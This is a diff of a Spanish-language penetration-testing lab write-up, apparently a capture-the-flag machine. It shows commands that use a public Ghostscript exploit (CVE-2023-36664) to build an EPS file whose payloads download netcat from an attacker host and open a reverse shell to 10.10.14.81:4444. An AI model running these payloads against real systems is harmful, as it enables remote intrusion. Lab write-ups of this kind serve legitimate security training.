@@ -187,8 +187,14 @@ Inició sesión en el sitio web es exitoso. Después de examinar el correo de la
 después de buscar en internet encontramos un exploit [github](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git) 
 ![[Pasted image 20240413001057.png]]
 
+
+### Ghostscript
+
 ```python
 python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.81:8000/nc64.exe -o nc.exe" --filename file.eps
 
+
 python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.81 4444 -e cmd.exe" --filename file.eps
 ```
+
+![[Pasted image 20240413004557.png]]
